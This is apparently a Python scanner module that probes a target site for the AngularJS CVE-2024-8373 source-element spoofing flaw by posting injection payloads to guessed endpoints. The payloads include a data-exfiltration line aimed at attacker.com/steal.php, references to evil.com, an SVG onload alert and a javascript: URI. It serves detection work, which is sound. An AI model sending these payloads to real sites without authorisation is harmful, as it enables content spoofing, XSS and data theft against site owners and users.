"""
CVE-2024-8373 Vulnerability Detection Script
AngularJS Content Spoofing in Source Elements - CVSS 4.8 (Medium)
HeroDevs Vulnerability Directory
"""

import requests
import re
from urllib.parse import urljoin

def scan(session, target_url):
    """
    掃描 CVE-2024-8373 弱點
    AngularJS Source 元素內容欺騙弱點
    影響版本: 所有 AngularJS 版本 (≥0.0.0)
    """
    result = {
        'vulnerable': False,
        'evidence': '',
        'description': 'CVE-2024-8373: AngularJS Source 元素內容欺騙弱點，可繞過 <source> 元素的圖片來源限制',
        'remediation': '更新到 AngularJS NES 1.9.8 或 1.5.24，實施嚴格的 source 元素驗證和來源限制'
    }
    
    try:
        print("      [檢測] 正在檢查 CVE-2024-8373 Source 元素內容欺騙弱點...")
        
        # 檢測 AngularJS 和 source 元素使用
        response = session.get(target_url, timeout=30)
        
        angular_indicators = [
            'angular.js',
            'angular.min.js',
            'ng-app',
            'ng-controller'
        ]
        
        source_indicators = [
            '<source',
            'ng-attr-srcset',
            'ngAttrSrcset',
            '<picture>',
            'source srcset'
        ]
        
        uses_angular = any(indicator in response.text.lower() for indicator in angular_indicators)
        uses_source = any(indicator in response.text.lower() for indicator in source_indicators)
        
        if not uses_angular:
            result['evidence'] = "未檢測到 AngularJS 應用程式"
            return result
        
        print(f"      [檢測] 發現 AngularJS 應用程式，source 元素使用情況: {'是' if uses_source else '否'}")
        
        # 測試 source 元素內容欺騙攻擊
        test_endpoints = [
            '/api/image',
            '/api/upload',
            '/api/gallery',
            '/api/media',
            '/upload',
            '/image',
            '/media',
            '/content',
            '/responsive'
        ]
        
        # CVE-2024-8373 特定攻擊負載
        source_bypass_payloads = [
            {
                'payload': '<picture><source ng-attr-srcset="https://untrusted.com/malicious.jpg" /><img src="fallback.jpg" /></picture>',
                'description': 'ng-attr-srcset bypass in source element'
            },
            {
                'payload': '<picture><source srcset="https://trusted.com/image.jpg" ng-attr-srcset="https://evil.com/malicious.svg" /><img src="" /></picture>',
                'description': 'Attribute override bypass'
            },
            {
                'payload': '<source ng-attr-srcset="data:image/svg+xml;base64,PHN2ZyBvbmxvYWQ9YWxlcnQoMSk+PC9zdmc+" />',
                'description': 'Data URI SVG injection'
            },
            {
                'payload': '<source ng-attr-srcset="https://attacker.com/steal.php?data={{userdata}}" />',
                'description': 'Data exfiltration attempt'
            },
            {
                'srcset': 'https://untrusted.com/malicious.jpg',
                'description': 'Direct srcset parameter'
            }
        ]
        
        for endpoint in test_endpoints:
            try:
                # 測試端點是否存在
                test_response = session.get(urljoin(target_url, endpoint), timeout=15)
                if test_response.status_code == 404:
                    continue
                
                print(f"      [檢測] 測試端點: {endpoint}")
                
                for payload_data in source_bypass_payloads:
                    try:
                        # 測試 HTML 內容注入
                        if 'payload' in payload_data:
                            post_data = {
                                'content': payload_data['payload'],
                                'html': payload_data['payload'],
                                'source_html': payload_data['payload'],
                                'responsive_content': payload_data['payload']
                            }
                        else:
                            post_data = {
                                'srcset': payload_data['srcset'],
                                'source_srcset': payload_data['srcset'],
                                'ng_attr_srcset': payload_data['srcset']
                            }
                        
                        response = session.post(
                            urljoin(target_url, endpoint),
                            data=post_data,
                            timeout=15
                        )
                        
                        # 檢查回應是否包含了惡意 source 內容
                        if response.status_code in [200, 201, 202]:
                            response_text = response.text.lower()
                            
                            # 檢查是否成功繞過了來源限制
                            bypass_indicators = [
                                'untrusted.com',
                                'evil.com',
                                'attacker.com',
                                'malicious.jpg',
                                'malicious.svg',
                                'ng-attr-srcset',
                                'data:image/svg+xml',
                                'steal.php'
                            ]
                            
                            found_indicators = [ind for ind in bypass_indicators if ind in response_text]
                            
                            if found_indicators:
                                result['vulnerable'] = True
                                result['evidence'] = f"在端點 {endpoint} 發現 CVE-2024-8373 source 元素內容欺騙弱點。{payload_data['description']} 成功繞過安全限制。回應包含惡意來源: {', '.join(found_indicators)}。這可能導致不受信任的內容載入或 XSS 攻擊。"
                                return result
                        
                        # 測試 JSON 格式
                        json_data = {
                            'source': payload_data.get('payload', ''),
                            'srcset': payload_data.get('srcset', ''),
                            'responsive_image': {
                                'source': payload_data.get('payload', '')
                            }
                        }
                        
                        headers = {'Content-Type': 'application/json'}
                        response = session.post(
                            urljoin(target_url, endpoint),
                            json=json_data,
                            headers=headers,
                            timeout=15
                        )
                        
                        if response.status_code in [200, 201, 202]:
                            if any(indicator in response.text.lower() for indicator in bypass_indicators):
                                result['vulnerable'] = True
                                result['evidence'] = f"在端點 {endpoint} 發現 source 元素繞過弱點 (JSON 格式)。{payload_data['description']} 繞過了安全限制。"
                                return result
                                
                    except Exception as e:
                        continue
                        
            except Exception as e:
                continue
        
        # 分析現有頁面中的 source 元素使用
        print("      [檢測] 分析現有頁面中的 source 元素實作...")
        
        source_patterns = [
            r'<source[^>]+ng-attr-srcset[^>]*>',
            r'<source[^>]+srcset[^>]*>',
            r'ng-attr-srcset\s*=\s*["\'][^"\']*["\']',
            r'<picture[^>]*>.*?<source[^>]*>.*?</picture>'
        ]
        
        found_source_usage = []
        for pattern in source_patterns:
            matches = re.findall(pattern, response.text, re.IGNORECASE | re.DOTALL)
            if matches:
                found_source_usage.extend(matches)
        
        if found_source_usage:
            print(f"      [檢測] 發現 {len(found_source_usage)} 個 source 元素相關用法")
            
            # 檢查是否有不安全的實作
            vulnerable_patterns = []
            for usage in found_source_usage:
                # 檢查是否使用了 ng-attr-srcset
                if 'ng-attr-srcset' in usage.lower():
                    vulnerable_patterns.append(usage)
                # 檢查是否包含動態內容
                elif '{{' in usage and '}}' in usage:
                    vulnerable_patterns.append(usage)
            
            if vulnerable_patterns:
                result['vulnerable'] = True
                result['evidence'] = f"在頁面中發現可能受 CVE-2024-8373 影響的 source 元素實作。發現 {len(vulnerable_patterns)} 個潛在弱點用法，包含 ng-attr-srcset 指令或動態內容。"
                return result
        
        # 測試特定的攻擊場景
        print("      [檢測] 測試特定攻擊場景...")
        
        # 測試 picture 元素注入
        picture_payloads = [
            '<picture><source media="(min-width: 800px)" ng-attr-srcset="https://evil.com/large.jpg"><source media="(min-width: 400px)" ng-attr-srcset="https://evil.com/medium.jpg"><img src="https://trusted.com/small.jpg"></picture>',
            '<picture><source ng-attr-srcset="javascript:alert(document.domain)"><img src="fallback.jpg"></picture>'
        ]
        
        for payload in picture_payloads:
            for endpoint in ['/api/content', '/api/template', '/content']:
                try:
                    response = session.post(
                        urljoin(target_url, endpoint),
                        data={'content': payload, 'html': payload},
                        timeout=10
                    )
                    
                    if response.status_code == 200:
                        if 'evil.com' in response.text or 'javascript:' in response.text:
                            result['vulnerable'] = True
                            result['evidence'] = f"在端點 {endpoint} 成功注入了惡意 picture/source 內容"
                            return result
                            
                except:
                    continue
        
        # 檢查現有的響應式圖片實作
        responsive_patterns = [
            r'<picture[^>]*>.*?</picture>',
            r'sizes\s*=\s*["\'][^"\']*["\']',
            r'media\s*=\s*["\'][^"\']*["\']'
        ]
        
        responsive_usage = []
        for pattern in responsive_patterns:
            matches = re.findall(pattern, response.text, re.IGNORECASE | re.DOTALL)
            if matches:
                responsive_usage.extend(matches)
        
        if responsive_usage:
            print(f"      [檢測] 發現 {len(responsive_usage)} 個響應式圖片實作")
            
            # 檢查是否有不安全的響應式實作
            for usage in responsive_usage:
                if 'ng-attr-srcset' in usage.lower() and ('{{' in usage or 'data:' in usage.lower()):
                    result['vulnerable'] = True
                    result['evidence'] = f"發現不安全的響應式圖片實作，可能受 CVE-2024-8373 影響: {usage[:100]}..."
                    return result
        
        result['evidence'] = f"完成 CVE-2024-8373 檢測。分析了 {len(test_endpoints)} 個端點和 {len(found_source_usage)} 個 source 元素用法，未發現明確的內容欺騙弱點。"
        
    except Exception as e:
        result['evidence'] = f"掃描過程中發生錯誤: {str(e)}"
    
    return result